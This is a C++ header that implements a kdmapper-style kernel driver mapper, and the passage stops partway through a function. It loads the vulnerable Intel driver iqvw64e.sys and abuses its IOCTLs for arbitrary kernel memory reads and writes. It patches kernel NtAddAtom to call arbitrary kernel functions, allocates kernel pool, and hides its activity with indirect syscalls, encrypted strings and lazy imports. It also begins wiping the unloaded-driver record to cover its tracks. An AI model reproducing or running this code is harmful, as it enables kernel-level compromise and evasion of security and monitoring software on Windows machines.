#pragma once
#include <windows.h>

#include "XorStr.hpp"
#include "Lazyimporter.hpp"
#include "IndirectSyscall.hpp"

// =============================================
//  DriverMapper.hpp
//
//  Integrates kdmapper-style driver mapping using
//  the scanner's own security primitives:
//    ISYSCALL  — indirect syscalls
//    lzimpLI_FN — lazy imports
//    xorstr_   — encrypted strings
//
//  Loads iqvw64e.sys (Intel vulnerable driver),
//  maps a target .sys into kernel pool via IOCTL,
//  calls its DriverEntry, then cleans up.
// =============================================

// Forward declarations for string helpers defined in ConsoleApplication7.cpp
extern size_t wlen(const wchar_t* s);
extern void wcpy(wchar_t* d, const wchar_t* s, size_t max);
extern int wicmp(const wchar_t* a, const wchar_t* b);
extern wchar_t g_ExeDirectory[MAX_PATH];

namespace DriverMapper {

    // ---- IOCTL structures for iqvw64e.sys ----

    constexpr ULONG IOCTL_NAL = 0x80862007;

    struct COPY_MEM_BUF {
        uint64_t case_number;   // 0x33
        uint64_t reserved;
        uint64_t source;
        uint64_t destination;
        uint64_t length;
    };

    struct GET_PHYS_BUF {
        uint64_t case_number;   // 0x25
        uint64_t reserved;
        uint64_t return_physical;
        uint64_t address_to_translate;
    };

    struct MAP_IO_BUF {
        uint64_t case_number;   // 0x19
        uint64_t reserved;
        uint64_t return_value;
        uint64_t return_virtual;
        uint64_t physical_address;
        uint32_t size;
    };

    struct UNMAP_IO_BUF {
        uint64_t case_number;   // 0x1A
        uint64_t reserved1;
        uint64_t reserved2;
        uint64_t virt_address;
        uint64_t reserved3;
        uint32_t number_of_bytes;
    };

    // ---- State ----

    inline HANDLE g_hDevice = NULL;
    inline uint64_t g_NtoskrnlAddr = 0;
    inline uint64_t g_KernelNtAddAtom = 0;
    inline void* g_UserNtAddAtom = nullptr;
    inline wchar_t g_ServiceName[64] = {};
    inline wchar_t g_DriverFilePath[MAX_PATH] = {};

    // =============================================
    //  IOCTL wrappers — all via ISYSCALL(NtDeviceIoControlFile)
    // =============================================

    __forceinline bool SendIoctl(void* inBuf, ULONG inSize) {
        MY_IO_STATUS_BLOCK iosb = {};
        NTSTATUS st = ISYSCALL(NtDeviceIoControlFile)(
            g_hDevice, (HANDLE)NULL, (PVOID)NULL, (PVOID)NULL,
            &iosb, IOCTL_NAL,
            inBuf, inSize,
            (PVOID)NULL, (ULONG)0);
        return NT_SUCCESS(st);
    }

    __forceinline bool MemCopy(uint64_t dst, uint64_t src, uint64_t len) {
        if (!dst || !src || !len) return false;
        COPY_MEM_BUF buf = {};
        buf.case_number = 0x33;
        buf.source = src;
        buf.destination = dst;
        buf.length = len;
        return SendIoctl(&buf, sizeof(buf));
    }

    __forceinline bool ReadKernelMemory(uint64_t addr, void* buffer, uint64_t size) {
        return MemCopy((uint64_t)buffer, addr, size);
    }

    __forceinline bool WriteKernelMemory(uint64_t addr, void* buffer, uint64_t size) {
        return MemCopy(addr, (uint64_t)buffer, size);
    }

    __forceinline bool GetPhysicalAddress(uint64_t addr, uint64_t* outPhys) {
        if (!addr) return false;
        GET_PHYS_BUF buf = {};
        buf.case_number = 0x25;
        buf.address_to_translate = addr;
        if (!SendIoctl(&buf, sizeof(buf))) return false;
        *outPhys = buf.return_physical;
        return true;
    }

    __forceinline uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
        if (!physAddr || !size) return 0;
        MAP_IO_BUF buf = {};
        buf.case_number = 0x19;
        buf.physical_address = physAddr;
        buf.size = size;
        if (!SendIoctl(&buf, sizeof(buf))) return 0;
        return buf.return_virtual;
    }

    __forceinline bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
        if (!virtAddr || !size) return false;
        UNMAP_IO_BUF buf = {};
        buf.case_number = 0x1A;
        buf.virt_address = virtAddr;
        buf.number_of_bytes = size;
        return SendIoctl(&buf, sizeof(buf));
    }

    __forceinline bool WriteToReadOnly(uint64_t addr, void* buffer, uint32_t size) {
        if (!addr || !buffer || !size) return false;
        uint64_t physAddr = 0;
        if (!GetPhysicalAddress(addr, &physAddr)) return false;
        uint64_t mapped = MapIoSpace(physAddr, size);
        if (!mapped) return false;
        bool ok = WriteKernelMemory(mapped, buffer, size);
        UnmapIoSpace(mapped, size);
        return ok;
    }

    // =============================================
    //  Resolve NtAddAtom addresses (user + kernel)
    // =============================================

    __declspec(noinline) void* FindNtdllExportByHash(BYTE* ntdllBase, DWORD targetHash) {
        auto dos = (IMAGE_DOS_HEADER*)ntdllBase;
        auto nt = (IMAGE_NT_HEADERS*)(ntdllBase + dos->e_lfanew);
        auto& expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!expDir.VirtualAddress) return nullptr;
        auto exp = (IMAGE_EXPORT_DIRECTORY*)(ntdllBase + expDir.VirtualAddress);
        auto names = (DWORD*)(ntdllBase + exp->AddressOfNames);
        auto funcs = (DWORD*)(ntdllBase + exp->AddressOfFunctions);
        auto ords = (WORD*)(ntdllBase + exp->AddressOfNameOrdinals);

        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            const char* name = (const char*)(ntdllBase + names[i]);
            // djb2 hash
            DWORD h = 5381;
            const char* p = name;
            while (*p) { h = ((h << 5) + h) + (unsigned char)*p; p++; }
            if (h == targetHash)
                return (void*)(ntdllBase + funcs[ords[i]]);
        }
        return nullptr;
    }

    // =============================================
    //  Kernel module enumeration — SystemModuleInformation (class 11)
    // =============================================

    struct RTL_PROCESS_MODULE_INFO {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    };

    struct RTL_PROCESS_MODULES {
        ULONG NumberOfModules;
        RTL_PROCESS_MODULE_INFO Modules[1];
    };

    __declspec(noinline) uint64_t GetKernelModuleAddress(const char* moduleName) {
        BYTE* buf = NULL;
        SIZE_T allocSz = 256 * 1024;
        ULONG retLen = 0;
        NTSTATUS st;

        for (int attempt = 0; attempt < 4; attempt++) {
            buf = NULL;
            ISYSCALL(NtAllocateVirtualMemory)(
                (HANDLE)-1, (PVOID*)&buf, (ULONG_PTR)0,
                &allocSz, (ULONG)0x3000, (ULONG)0x04);
            if (!buf) return 0;

            st = ISYSCALL(NtQuerySystemInformation)(
                (ULONG)11, // SystemModuleInformation
                (PVOID)buf, (ULONG)allocSz, &retLen);

            if (st == (NTSTATUS)0xC0000004L) {
                SIZE_T freeSz = 0;
                ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&buf, &freeSz, (ULONG)0x8000);
                buf = NULL;
                allocSz *= 2;
                continue;
            }
            break;
        }

        if (!buf || !NT_SUCCESS(st)) {
            if (buf) { SIZE_T fs = 0; ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&buf, &fs, (ULONG)0x8000); }
            return 0;
        }

        uint64_t result = 0;
        auto modules = (RTL_PROCESS_MODULES*)buf;

        for (ULONG i = 0; i < modules->NumberOfModules; i++) {
            auto& mod = modules->Modules[i];
            const char* name = (const char*)&mod.FullPathName[mod.OffsetToFileName];

            // Case-insensitive compare
            const char* a = name;
            const char* b = moduleName;
            bool match = true;
            while (*a && *b) {
                char ca = *a, cb = *b;
                if (ca >= 'A' && ca <= 'Z') ca += 32;
                if (cb >= 'A' && cb <= 'Z') cb += 32;
                if (ca != cb) { match = false; break; }
                a++; b++;
            }
            if (match && *a == 0 && *b == 0) {
                result = (uint64_t)mod.ImageBase;
                break;
            }
        }

        SIZE_T fs = 0;
        ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&buf, &fs, (ULONG)0x8000);
        return result;
    }

    // =============================================
    //  Get kernel module export by name
    // =============================================

    __declspec(noinline) uint64_t GetKernelModuleExport(uint64_t moduleBase, const char* funcName) {
        if (!moduleBase) return 0;

        IMAGE_DOS_HEADER dosHdr = {};
        IMAGE_NT_HEADERS64 ntHdr = {};

        if (!ReadKernelMemory(moduleBase, &dosHdr, sizeof(dosHdr)) ||
            dosHdr.e_magic != IMAGE_DOS_SIGNATURE)
            return 0;
        if (!ReadKernelMemory(moduleBase + dosHdr.e_lfanew, &ntHdr, sizeof(ntHdr)) ||
            ntHdr.Signature != IMAGE_NT_SIGNATURE)
            return 0;

        DWORD expBase = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        DWORD expSize = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
        if (!expBase || !expSize) return 0;

        // Allocate local buffer for export directory
        BYTE* expData = NULL;
        SIZE_T expAllocSz = (SIZE_T)expSize;
        ISYSCALL(NtAllocateVirtualMemory)(
            (HANDLE)-1, (PVOID*)&expData, (ULONG_PTR)0,
            &expAllocSz, (ULONG)0x3000, (ULONG)0x04);
        if (!expData) return 0;

        if (!ReadKernelMemory(moduleBase + expBase, expData, expSize)) {
            SIZE_T fs = 0; ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&expData, &fs, (ULONG)0x8000);
            return 0;
        }

        uint64_t delta = (uint64_t)expData - expBase;
        auto exp = (IMAGE_EXPORT_DIRECTORY*)expData;
        auto nameTable = (DWORD*)(exp->AddressOfNames + delta);
        auto ordTable = (WORD*)(exp->AddressOfNameOrdinals + delta);
        auto funcTable = (DWORD*)(exp->AddressOfFunctions + delta);

        uint64_t result = 0;
        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            const char* name = (const char*)(nameTable[i] + delta);
            // Compare
            const char* a = name;
            const char* b = funcName;
            while (*a && *b && *a == *b) { a++; b++; }
            if (*a == 0 && *b == 0) {
                DWORD funcRva = funcTable[ordTable[i]];
                if (funcRva <= 0x1000) break;
                uint64_t addr = moduleBase + funcRva;
                // Check for forwarded export
                if (addr >= moduleBase + expBase && addr <= moduleBase + expBase + expSize) {
                    break; // forwarded, skip
                }
                result = addr;
                break;
            }
        }

        SIZE_T fs = 0;
        ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&expData, &fs, (ULONG)0x8000);
        return result;
    }

    // =============================================
    //  CallKernelFunction — NtAddAtom hook
    //
    //  Patches kernel NtAddAtom with JMP to target,
    //  calls usermode NtAddAtom (which syscalls into
    //  the patched kernel function), then restores.
    // =============================================

    // Max 4 args on x64 register-passed
    template<typename RetT>
    __declspec(noinline) bool CallKernel0(RetT* out, uint64_t kernelFunc) {
        if (!kernelFunc || !g_UserNtAddAtom) return false;

        uint8_t jmpShell[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
        uint8_t original[sizeof(jmpShell)];
        *(uint64_t*)&jmpShell[2] = kernelFunc;

        if (!ReadKernelMemory(g_KernelNtAddAtom, original, sizeof(jmpShell))) return false;
        if (!WriteToReadOnly(g_KernelNtAddAtom, jmpShell, sizeof(jmpShell))) return false;

        using Fn = RetT(__stdcall*)();
        if (out) *out = ((Fn)g_UserNtAddAtom)();

        WriteToReadOnly(g_KernelNtAddAtom, original, sizeof(jmpShell));
        return true;
    }

    template<typename RetT, typename A1>
    __declspec(noinline) bool CallKernel1(RetT* out, uint64_t kernelFunc, A1 a1) {
        if (!kernelFunc || !g_UserNtAddAtom) return false;

        uint8_t jmpShell[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
        uint8_t original[sizeof(jmpShell)];
        *(uint64_t*)&jmpShell[2] = kernelFunc;

        if (!ReadKernelMemory(g_KernelNtAddAtom, original, sizeof(jmpShell))) return false;
        if (!WriteToReadOnly(g_KernelNtAddAtom, jmpShell, sizeof(jmpShell))) return false;

        using Fn = RetT(__stdcall*)(A1);
        if (out) *out = ((Fn)g_UserNtAddAtom)(a1);

        WriteToReadOnly(g_KernelNtAddAtom, original, sizeof(jmpShell));
        return true;
    }

    template<typename RetT, typename A1, typename A2>
    __declspec(noinline) bool CallKernel2(RetT* out, uint64_t kernelFunc, A1 a1, A2 a2) {
        if (!kernelFunc || !g_UserNtAddAtom) return false;

        uint8_t jmpShell[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
        uint8_t original[sizeof(jmpShell)];
        *(uint64_t*)&jmpShell[2] = kernelFunc;

        if (!ReadKernelMemory(g_KernelNtAddAtom, original, sizeof(jmpShell))) return false;
        if (!WriteToReadOnly(g_KernelNtAddAtom, jmpShell, sizeof(jmpShell))) return false;

        using Fn = RetT(__stdcall*)(A1, A2);
        if (out) *out = ((Fn)g_UserNtAddAtom)(a1, a2);

        WriteToReadOnly(g_KernelNtAddAtom, original, sizeof(jmpShell));
        return true;
    }

    template<typename RetT, typename A1, typename A2, typename A3>
    __declspec(noinline) bool CallKernel3(RetT* out, uint64_t kernelFunc, A1 a1, A2 a2, A3 a3) {
        if (!kernelFunc || !g_UserNtAddAtom) return false;

        uint8_t jmpShell[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
        uint8_t original[sizeof(jmpShell)];
        *(uint64_t*)&jmpShell[2] = kernelFunc;

        if (!ReadKernelMemory(g_KernelNtAddAtom, original, sizeof(jmpShell))) return false;
        if (!WriteToReadOnly(g_KernelNtAddAtom, jmpShell, sizeof(jmpShell))) return false;

        using Fn = RetT(__stdcall*)(A1, A2, A3);
        if (out) *out = ((Fn)g_UserNtAddAtom)(a1, a2, a3);

        WriteToReadOnly(g_KernelNtAddAtom, original, sizeof(jmpShell));
        return true;
    }

    template<typename RetT, typename A1, typename A2, typename A3, typename A4>
    __declspec(noinline) bool CallKernel4(RetT* out, uint64_t kernelFunc, A1 a1, A2 a2, A3 a3, A4 a4) {
        if (!kernelFunc || !g_UserNtAddAtom) return false;

        uint8_t jmpShell[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
        uint8_t original[sizeof(jmpShell)];
        *(uint64_t*)&jmpShell[2] = kernelFunc;

        if (!ReadKernelMemory(g_KernelNtAddAtom, original, sizeof(jmpShell))) return false;
        if (!WriteToReadOnly(g_KernelNtAddAtom, jmpShell, sizeof(jmpShell))) return false;

        using Fn = RetT(__stdcall*)(A1, A2, A3, A4);
        if (out) *out = ((Fn)g_UserNtAddAtom)(a1, a2, a3, a4);

        WriteToReadOnly(g_KernelNtAddAtom, original, sizeof(jmpShell));
        return true;
    }

    // Void-return variant (for ExFreePool etc.)
    __declspec(noinline) bool CallKernelVoid1(uint64_t kernelFunc, uint64_t a1) {
        if (!kernelFunc || !g_UserNtAddAtom) return false;

        uint8_t jmpShell[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
        uint8_t original[sizeof(jmpShell)];
        *(uint64_t*)&jmpShell[2] = kernelFunc;

        if (!ReadKernelMemory(g_KernelNtAddAtom, original, sizeof(jmpShell))) return false;
        if (!WriteToReadOnly(g_KernelNtAddAtom, jmpShell, sizeof(jmpShell))) return false;

        using Fn = void(__stdcall*)(uint64_t);
        ((Fn)g_UserNtAddAtom)(a1);

        WriteToReadOnly(g_KernelNtAddAtom, original, sizeof(jmpShell));
        return true;
    }

    // =============================================
    //  Pool allocation via ExAllocatePoolWithTag
    // =============================================

    __declspec(noinline) uint64_t AllocatePool(uint64_t size) {
        static uint64_t kExAllocatePool = 0;
        if (!kExAllocatePool) {
            kExAllocatePool = GetKernelModuleExport(g_NtoskrnlAddr, xorstr_("ExAllocatePoolWithTag"));
            if (!kExAllocatePool) return 0;
        }
        uint64_t allocated = 0;
        // NonPagedPool = 0, tag = 'btwE'
        if (!CallKernel3(&allocated, kExAllocatePool, (uint64_t)0, size, (uint64_t)0x45777462))
            return 0;
        return allocated;
    }

    __declspec(noinline) bool FreePool(uint64_t addr) {
        static uint64_t kExFreePool = 0;
        if (!kExFreePool) {
            kExFreePool = GetKernelModuleExport(g_NtoskrnlAddr, xorstr_("ExFreePool"));
            if (!kExFreePool) return false;
        }
        return CallKernelVoid1(kExFreePool, addr);
    }

    // =============================================
    //  Service management — load/unload iqvw64e.sys
    // =============================================

    __declspec(noinline) void GenerateRandomName(wchar_t* out, int maxLen) {
        LARGE_INTEGER pc;
        lzimpLI_FN(QueryPerformanceCounter)(&pc);
        uint64_t seed = pc.QuadPart;

        int len = 10 + (int)(seed % 15);
        if (len >= maxLen) len = maxLen - 1;
        for (int i = 0; i < len; i++) {
            seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
            int idx = (int)((seed >> 33) % 26);
            out[i] = L'a' + (wchar_t)idx;
        }
        out[len] = 0;
    }

    __declspec(noinline) bool GetExeDirectory(wchar_t* outDir, size_t maxChars) {
#if defined(_M_X64)
        auto peb = (BYTE*)__readgsqword(0x60);
#else
        auto peb = (BYTE*)__readfsdword(0x30);
#endif
        auto params = *(BYTE**)(peb + 0x20);
        auto imgPath = (MY_UNICODE_STRING*)(params + 0x60); // ImagePathName

        USHORT chars = imgPath->Length / sizeof(wchar_t);
        if (chars >= (USHORT)maxChars) chars = (USHORT)(maxChars - 1);

        for (USHORT i = 0; i < chars; i++)
            outDir[i] = imgPath->Buffer[i];
        outDir[chars] = 0;

        // Strip filename — find last backslash
        int lastSlash = -1;
        for (int i = (int)chars - 1; i >= 0; i--) {
            if (outDir[i] == L'\\') { lastSlash = i; break; }
        }
        if (lastSlash >= 0)
            outDir[lastSlash + 1] = 0;
        return true;
    }

    __declspec(noinline) bool ReadFileToMemory(const wchar_t* ntPath, BYTE** outBuf, DWORD* outSize) {
        wchar_t pathBuf[MAX_PATH];
        MY_UNICODE_STRING filePath;
        MY_OBJECT_ATTRIBUTES oa;
        wcpy(pathBuf, ntPath, MAX_PATH);

        USHORT len = (USHORT)wlen(pathBuf);
        filePath.Buffer = pathBuf;
        filePath.Length = (USHORT)(len * sizeof(wchar_t));
        filePath.MaximumLength = (USHORT)(MAX_PATH * sizeof(wchar_t));
        oa.Length = sizeof(MY_OBJECT_ATTRIBUTES);
        oa.RootDirectory = NULL;
        oa.ObjectName = &filePath;
        oa.Attributes = OBJ_CASE_INSENSITIVE;
        oa.SecurityDescriptor = NULL;
        oa.SecurityQualityOfService = NULL;

        HANDLE hFile = NULL;
        MY_IO_STATUS_BLOCK iosb = {};
        NTSTATUS st = ISYSCALL(NtOpenFile)(
            &hFile, (ACCESS_MASK)(FILE_READ_DATA | SYNCHRONIZE), &oa, &iosb,
            (ULONG)(FILE_SHARE_READ), (ULONG)(0x00000020 | 0x00000004)); // NON_DIRECTORY | SYNCHRONOUS_IO_NONALERT
        if (!NT_SUCCESS(st)) return false;

        // Get file size
        F_STANDARD_INFO stdInfo = {};
        ISYSCALL(NtQueryInformationFile)(hFile, &iosb, &stdInfo, sizeof(stdInfo), 5);
        DWORD fileSize = (DWORD)stdInfo.EndOfFile.QuadPart;
        if (fileSize == 0 || fileSize > 16 * 1024 * 1024) { // max 16MB
            ISYSCALL(NtClose)(hFile);
            return false;
        }

        // Allocate buffer
        BYTE* buf = NULL;
        SIZE_T allocSz = (SIZE_T)fileSize;
        ISYSCALL(NtAllocateVirtualMemory)(
            (HANDLE)-1, (PVOID*)&buf, (ULONG_PTR)0,
            &allocSz, (ULONG)0x3000, (ULONG)0x04);
        if (!buf) { ISYSCALL(NtClose)(hFile); return false; }

        // Read file
        LARGE_INTEGER offset = {};
        st = ISYSCALL(NtReadFile)(
            hFile, (HANDLE)NULL, (PVOID)NULL, (PVOID)NULL,
            &iosb, buf, fileSize, &offset, (PULONG)NULL);
        ISYSCALL(NtClose)(hFile);

        if (!NT_SUCCESS(st)) {
            SIZE_T fs = 0; ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&buf, &fs, (ULONG)0x8000);
            return false;
        }

        *outBuf = buf;
        *outSize = fileSize;
        return true;
    }

    __declspec(noinline) bool WriteFileFromMemory(const wchar_t* ntPath, BYTE* data, DWORD size) {
        wchar_t pathBuf[MAX_PATH];
        MY_UNICODE_STRING filePath;
        MY_OBJECT_ATTRIBUTES oa;
        wcpy(pathBuf, ntPath, MAX_PATH);

        USHORT len = (USHORT)wlen(pathBuf);
        filePath.Buffer = pathBuf;
        filePath.Length = (USHORT)(len * sizeof(wchar_t));
        filePath.MaximumLength = (USHORT)(MAX_PATH * sizeof(wchar_t));
        oa.Length = sizeof(MY_OBJECT_ATTRIBUTES);
        oa.RootDirectory = NULL;
        oa.ObjectName = &filePath;
        oa.Attributes = OBJ_CASE_INSENSITIVE;
        oa.SecurityDescriptor = NULL;
        oa.SecurityQualityOfService = NULL;

        // NtCreateFile to create/overwrite — we don't have NtCreateFile in syscall table
        // Use lazy import CreateFileW instead, then NtWriteFile
        HANDLE hFile = lzimpLI_FN(CreateFileW)(
            pathBuf + 4, // skip "\??\" prefix for Win32
            (DWORD)GENERIC_WRITE, (DWORD)0,
            (LPSECURITY_ATTRIBUTES)NULL, (DWORD)CREATE_ALWAYS,
            (DWORD)FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
        if (!hFile || hFile == INVALID_HANDLE_VALUE) return false;

        MY_IO_STATUS_BLOCK iosb = {};
        NTSTATUS st = ISYSCALL(NtWriteFile)(
            hFile, (HANDLE)NULL, (PVOID)NULL, (PVOID)NULL,
            &iosb, (PVOID)data, size,
            (PLARGE_INTEGER)NULL, (PULONG)NULL);
        ISYSCALL(NtClose)(hFile);
        return NT_SUCCESS(st);
    }

    __declspec(noinline) bool LoadVulnDriver(BYTE* driverData, DWORD driverSize) {
        // Fixed service name
        wcpy(g_ServiceName, xorstr_(L"XSCANNERDRIVER"), 64);

        // Build dest path: \??\<exeDir>\<random>.sys
        // Use g_ExeDirectory saved before anti-dump (PEB is corrupted after)
        wcpy(g_DriverFilePath, xorstr_(L"\\??\\"), MAX_PATH);
        size_t pos = wlen(g_DriverFilePath);
        // Append exe dir (skip \??\ prefix from exeDir if present)
        const wchar_t* dirSrc = g_ExeDirectory;
        if (dirSrc[0] == L'\\' && dirSrc[1] == L'?' && dirSrc[2] == L'?' && dirSrc[3] == L'\\')
            dirSrc += 4;
        size_t dirLen = wlen(dirSrc);
        for (size_t i = 0; i < dirLen && pos < MAX_PATH - 1; i++)
            g_DriverFilePath[pos++] = dirSrc[i];
        // Append service name
        size_t nameLen = wlen(g_ServiceName);
        for (size_t i = 0; i < nameLen && pos < MAX_PATH - 1; i++)
            g_DriverFilePath[pos++] = g_ServiceName[i];
        // Append .sys (xorstr_ used inline to avoid dangling pointer)
        g_DriverFilePath[pos++] = L'.';
        g_DriverFilePath[pos++] = L's';
        g_DriverFilePath[pos++] = L'y';
        g_DriverFilePath[pos++] = L's';
        g_DriverFilePath[pos] = 0;

        // Write embedded driver data to temp file on disk (NtLoadDriver requires a file)
        if (!WriteFileFromMemory(g_DriverFilePath, driverData, driverSize)) {
            return false;
        }

        // Acquire SeLoadDriverPrivilege
        BOOLEAN oldVal = FALSE;
        lzimpLI_FN(RtlAdjustPrivilege)((ULONG)10, (BOOLEAN)TRUE, (BOOLEAN)FALSE, &oldVal);

        // Create service registry key
        // \Registry\Machine\SYSTEM\CurrentControlSet\Services\<name>
        wchar_t regPath[512];
        wcpy(regPath, xorstr_(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\"), 512);
        pos = wlen(regPath);
        for (size_t i = 0; i < nameLen && pos < 511; i++)
            regPath[pos++] = g_ServiceName[i];
        regPath[pos] = 0;

        MY_UNICODE_STRING keyPath;
        keyPath.Buffer = regPath;
        keyPath.Length = (USHORT)(wlen(regPath) * sizeof(wchar_t));
        keyPath.MaximumLength = (USHORT)(512 * sizeof(wchar_t));

        MY_OBJECT_ATTRIBUTES keyOa;
        keyOa.Length = sizeof(MY_OBJECT_ATTRIBUTES);
        keyOa.RootDirectory = NULL;
        keyOa.ObjectName = &keyPath;
        keyOa.Attributes = OBJ_CASE_INSENSITIVE;
        keyOa.SecurityDescriptor = NULL;
        keyOa.SecurityQualityOfService = NULL;

        HANDLE hKey = NULL;
        ULONG disposition = 0;
        NTSTATUS st = ISYSCALL(NtCreateKey)(
            &hKey, (ACCESS_MASK)(KEY_ALL_ACCESS), &keyOa,
            (ULONG)0, (MY_UNICODE_STRING*)NULL, (ULONG)0, &disposition);
        if (!NT_SUCCESS(st)) {
            return false;
        }

        // Set ImagePath
        wchar_t imgPathName[16];
        wcpy(imgPathName, xorstr_(L"ImagePath"), 16);
        MY_UNICODE_STRING imgPathVal;
        imgPathVal.Buffer = imgPathName;
        imgPathVal.Length = (USHORT)(wlen(imgPathName) * sizeof(wchar_t));
        imgPathVal.MaximumLength = (USHORT)(16 * sizeof(wchar_t));

        st = ISYSCALL(NtSetValueKey)(
            hKey, &imgPathVal, (ULONG)0, (ULONG)REG_EXPAND_SZ,
            (PVOID)g_DriverFilePath,
            (ULONG)((wlen(g_DriverFilePath) + 1) * sizeof(wchar_t)));
        if (!NT_SUCCESS(st)) {
            return false;
        }

        // Set Type = 1 (kernel driver)
        wchar_t typeName[8];
        wcpy(typeName, xorstr_(L"Type"), 8);
        MY_UNICODE_STRING typeVal;
        typeVal.Buffer = typeName;
        typeVal.Length = (USHORT)(wlen(typeName) * sizeof(wchar_t));
        typeVal.MaximumLength = (USHORT)(8 * sizeof(wchar_t));
        DWORD typeData = 1;
        st = ISYSCALL(NtSetValueKey)(
            hKey, &typeVal, (ULONG)0, (ULONG)REG_DWORD,
            (PVOID)&typeData, (ULONG)sizeof(DWORD));
        if (!NT_SUCCESS(st)) {
            return false;
        }

        ISYSCALL(NtClose)(hKey);

        // NtLoadDriver
        st = ISYSCALL(NtLoadDriver)(&keyPath);
        if (!NT_SUCCESS(st)) {
            // Cleanup on failure
            hKey = NULL;
            ISYSCALL(NtOpenKey)(&hKey, (ACCESS_MASK)KEY_ALL_ACCESS, &keyOa);
            if (hKey) { ISYSCALL(NtDeleteKey)(hKey); ISYSCALL(NtClose)(hKey); }
            return false;
        }

        return true;
    }

    __declspec(noinline) void UnloadVulnDriver() {
        // Close device handle
        if (g_hDevice && g_hDevice != INVALID_HANDLE_VALUE) {
            ISYSCALL(NtClose)(g_hDevice);
            g_hDevice = NULL;
        }

        // NtUnloadDriver
        wchar_t regPath[512];
        wcpy(regPath, xorstr_(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\"), 512);
        size_t pos = wlen(regPath);
        size_t nameLen = wlen(g_ServiceName);
        for (size_t i = 0; i < nameLen && pos < 511; i++)
            regPath[pos++] = g_ServiceName[i];
        regPath[pos] = 0;

        MY_UNICODE_STRING svcPath;
        svcPath.Buffer = regPath;
        svcPath.Length = (USHORT)(wlen(regPath) * sizeof(wchar_t));
        svcPath.MaximumLength = (USHORT)(512 * sizeof(wchar_t));

        ISYSCALL(NtUnloadDriver)(&svcPath);

        // Delete registry key
        MY_OBJECT_ATTRIBUTES keyOa;
        keyOa.Length = sizeof(MY_OBJECT_ATTRIBUTES);
        keyOa.RootDirectory = NULL;
        keyOa.ObjectName = &svcPath;
        keyOa.Attributes = OBJ_CASE_INSENSITIVE;
        keyOa.SecurityDescriptor = NULL;
        keyOa.SecurityQualityOfService = NULL;

        HANDLE hKey = NULL;
        if (NT_SUCCESS(ISYSCALL(NtOpenKey)(&hKey, (ACCESS_MASK)KEY_ALL_ACCESS, &keyOa))) {
            ISYSCALL(NtDeleteKey)(hKey);
            ISYSCALL(NtClose)(hKey);
        }

        // Delete driver file from disk
        if (g_DriverFilePath[0]) {
            lzimpLI_FN(DeleteFileW)(g_DriverFilePath + 4); // skip \??\ prefix
        }
    }

    __declspec(noinline) bool OpenDevice() {
        wchar_t devPath[32];
        wcpy(devPath, xorstr_(L"\\??\\Nal"), 32);

        MY_UNICODE_STRING devStr;
        devStr.Buffer = devPath;
        devStr.Length = (USHORT)(wlen(devPath) * sizeof(wchar_t));
        devStr.MaximumLength = (USHORT)(32 * sizeof(wchar_t));

        MY_OBJECT_ATTRIBUTES oa;
        oa.Length = sizeof(MY_OBJECT_ATTRIBUTES);
        oa.RootDirectory = NULL;
        oa.ObjectName = &devStr;
        oa.Attributes = OBJ_CASE_INSENSITIVE;
        oa.SecurityDescriptor = NULL;
        oa.SecurityQualityOfService = NULL;

        MY_IO_STATUS_BLOCK iosb = {};
        NTSTATUS st = ISYSCALL(NtOpenFile)(
            &g_hDevice, (ACCESS_MASK)(GENERIC_READ | GENERIC_WRITE),
            &oa, &iosb, (ULONG)0, (ULONG)0);
        return NT_SUCCESS(st) && g_hDevice;
    }

    // =============================================
    //  ClearMmUnloadedDrivers — zero the driver name
    //  length to prevent MiRememberUnloadedDriver logging
    // =============================================

    __declspec(noinline) bool ClearMmUnloadedDrivers() {
        // Query SystemExtendedHandleInformation (class 64)
        BYTE* buf = NULL;
        SIZE_T allocSz = 1024 * 1024;
        ULONG retLen = 0;
        NTSTATUS st;

        for (int attempt = 0; attempt < 4; attempt++) {
            buf = NULL;
            ISYSCALL(NtAllocateVirtualMemory)(
                (HANDLE)-1, (PVOID*)&buf, (ULONG_PTR)0,
                &allocSz, (ULONG)0x3000, (ULONG)0x04);
            if (!buf) return false;

            st = ISYSCALL(NtQuerySystemInformation)(
                (ULONG)64, // SystemExtendedHandleInformation
                (PVOID)buf, (ULONG)allocSz, &retLen);
            if (st == (NTSTATUS)0xC0000004L) {
                SIZE_T fs = 0; ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&buf, &fs, (ULONG)0x8000);
                buf = NULL;
                allocSz *= 2;
                continue;
            }
            break;
        }

        if (!buf || !NT_SUCCESS(st)) {
            if (buf) { SIZE_T fs = 0; ISYSCALL(NtFreeVirtualMemory)((HANDLE)-1, (PVOID*)&buf, &fs, (ULONG)0x8000); }
            return false;
        }

        // Find our device handle in the handle table
